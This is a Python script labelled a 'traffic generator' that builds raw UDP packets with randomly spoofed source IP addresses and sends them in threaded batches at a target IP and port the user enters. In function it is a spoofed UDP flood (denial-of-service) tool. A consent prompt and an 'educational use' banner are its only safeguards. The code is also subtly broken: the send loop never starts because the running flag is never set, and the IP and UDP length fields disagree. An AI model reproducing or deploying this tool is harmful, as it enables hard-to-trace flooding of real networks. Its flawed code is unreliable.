import time
import random
import socket
import struct
import json
import threading
import os
import sys
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

class LowResourceTrafficGenerator:
    def __init__(self):
        self.running = False
        self.test_id = int(time.time())
        self.metrics = {
            "total_packets": 0,
            "total_bytes": 0,
            "start_time": None,
            "end_time": None
        }

        # Low-resource configuration
        self.MAX_THREADS = 2
        self.BATCH_SIZE = 10  # Reduced packet batch size
        self.MAX_RETRIES = 3
        self.THROTTLE_INTERVAL = 0.1  # Seconds between batches

        # Get validated user input
        self.target_ip = self._get_valid_ip()
        self.target_port = self._get_valid_port()
        self.test_duration = self._get_valid_duration()
        self.min_packet_size, self.max_packet_size = self._get_valid_packet_sizes()

        # Initialize raw socket
        self.sock = self._create_raw_socket()

    def _create_raw_socket(self):
        """Create raw socket with error handling"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except PermissionError:
            print(Fore.RED + "[!] Error: Requires root privileges. Use sudo.")
            sys.exit(1)
        except Exception as e:
            print(Fore.RED + f"[!] Socket creation failed: {str(e)}")
            sys.exit(1)

    def _get_valid_ip(self):
        """Validate IP address format with retries"""
        for _ in range(self.MAX_RETRIES):
            try:
                ip = input(Fore.BLUE + "Enter target IP: " + Fore.MAGENTA)
                socket.inet_aton(ip)
                return ip
            except socket.error:
                print(Fore.RED + "Invalid IP format. Try again.")
        print(Fore.RED + "[!] Maximum retries exceeded.")
        sys.exit(1)

    def _get_valid_port(self):
        """Validate port number with retries"""
        for _ in range(self.MAX_RETRIES):
            try:
                port = int(input(Fore.BLUE + "Enter port (1-65535): " + Fore.MAGENTA))
                if 1 <= port <= 65535:
                    return port
                print(Fore.RED + "Port must be 1-65535")
            except ValueError:
                print(Fore.RED + "Invalid number")
        print(Fore.RED + "[!] Maximum retries exceeded.")
        sys.exit(1)

    def _get_valid_duration(self):
        """Validate test duration with retries"""
        for _ in range(self.MAX_RETRIES):
            try:
                duration = int(input(Fore.BLUE + "Duration (1-600s): " + Fore.MAGENTA))
                if 1 <= duration <= 600:  # Reduced maximum duration
                    return duration
                print(Fore.RED + "Duration must be 1-600 seconds")
            except ValueError:
                print(Fore.RED + "Invalid number")
        print(Fore.RED + "[!] Maximum retries exceeded.")
        sys.exit(1)

    def _get_valid_packet_sizes(self):
        """Validate packet sizes with retries"""
        for _ in range(self.MAX_RETRIES):
            try:
                min_size = int(input(Fore.BLUE + "Min size (64-1024): " + Fore.MAGENTA))
                max_size = int(input(Fore.BLUE + "Max size (64-1024): " + Fore.MAGENTA))
                if 64 <= min_size <= max_size <= 1024:  # Reduced max packet size
                    return min_size, max_size
                print(Fore.RED + "Invalid size range (64-1024)")
            except ValueError:
                print(Fore.RED + "Invalid numbers")
        print(Fore.RED + "[!] Maximum retries exceeded.")
        sys.exit(1)

    def _generate_packet(self):
        """Generate UDP packet with minimal resource usage"""
        try:
            # Generate random source IP
            src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            
            # IP Header
            ip_ver_ihl = 0x45
            ip_tos = 0
            ip_total_len = 20 + 8 + random.randint(self.min_packet_size, self.max_packet_size)
            ip_id = random.randint(1000, 65535)
            ip_frag_off = 0
            ip_ttl = 64
            ip_proto = socket.IPPROTO_UDP
            ip_check = 0  # Will be calculated later
            ip_saddr = socket.inet_aton(src_ip)
            ip_daddr = socket.inet_aton(self.target_ip)

            # UDP Header
            src_port = random.randint(1024, 65535)
            dest_port = self.target_port
            udp_length = 8 + random.randint(self.min_packet_size, self.max_packet_size)
            udp_checksum = 0

            # Packet assembly
            ip_header = struct.pack("!BBHHHBBH4s4s",
                                   ip_ver_ihl, ip_tos, ip_total_len,
                                   ip_id, ip_frag_off, ip_ttl, ip_proto,
                                   ip_check, ip_saddr, ip_daddr)

            udp_header = struct.pack("!HHHH", src_port, dest_port, udp_length, udp_checksum)
            payload = os.urandom(udp_length - 8)

            return ip_header + udp_header + payload
        except Exception as e:
            print(Fore.RED + f"[!] Packet generation error: {str(e)}")
            return None

    def _send_batch(self):
        """Send batch of packets with error handling"""
        for _ in range(self.BATCH_SIZE):
            packet = self._generate_packet()
            if packet:
                try:
                    self.sock.sendto(packet, (self.target_ip, self.target_port))
                    self.metrics["total_packets"] += 1
                    self.metrics["total_bytes"] += len(packet)
                except socket.error as e:
                    print(Fore.RED + f"[!] Send error: {str(e)}")
                    time.sleep(1)  # Backoff on errors
                except Exception as e:
                    print(Fore.RED + f"[!] General error: {str(e)}")

    def _verify_permissions(self):
        """Ethical requirements check"""
        print(Fore.RED + "\nETHICAL REQUIREMENTS:")
        print("1. Written authorization required")
        print("2. Isolated network environment")
        print("3. No production impact\n")
        
        consent = input(Fore.WHITE + "[?] Confirm all requirements met (yes/no): ").lower()
        return consent == "yes"

    def start_test(self):
        """Main test execution with resource monitoring"""
        if not self._verify_permissions():
            print(Fore.RED + "[!] Test aborted")
            return

        print(Fore.YELLOW + "\n[!] Starting low-resource test")
        print(Fore.CYAN + f"• Target: {self.target_ip}:{self.target_port}")
        print(Fore.CYAN + f"• Duration: {self.test_duration}s")
        print(Fore.CYAN + f"• Packet Size: {self.min_packet_size}-{self.max_packet_size} bytes\n")

        self.metrics["start_time"] = time.time()
        end_time = time.time() + self.test_duration
        
        try:
            while time.time() < end_time and self.running:
                # Limited thread pool for low-resource devices
                threads = []
                for _ in range(self.MAX_THREADS):
                    t = threading.Thread(target=self._send_batch)
                    t.start()
                    threads.append(t)
                    time.sleep(self.THROTTLE_INTERVAL)

                for t in threads:
                    t.join()

        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Test aborted by user")
        finally:
            self.running = False
            self.sock.close()
            self.metrics["end_time"] = time.time()
            self._save_report()
            print(Fore.GREEN + f"[+] Test complete. Report saved to test_report_{self.test_id}.json")

    def _save_report(self):
        """Save test report with error handling"""
        try:
            report = {
                "test_id": self.test_id,
                "target": f"{self.target_ip}:{self.target_port}",
                "duration": self.test_duration,
                "packet_size_range": f"{self.min_packet_size}-{self.max_packet_size}",
                "metrics": self.metrics
            }
            with open(f"test_report_{self.test_id}.json", "w") as f:
                json.dump(report, f, indent=2)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to save report: {str(e)}")

if __name__ == "__main__":
    print(Fore.MAGENTA + Style.BRIGHT + "\nLow-Resource Traffic Generator")
    print(Fore.BLUE + "Authorized educational use only")
    print(Fore.RED + "Unauthorized use is illegal!\n")
    
    try:
        generator = LowResourceTrafficGenerator()
        generator.start_test()
    except Exception as e:
        print(Fore.RED + f"[!] Critical error: {str(e)}")
        sys.exit(1)
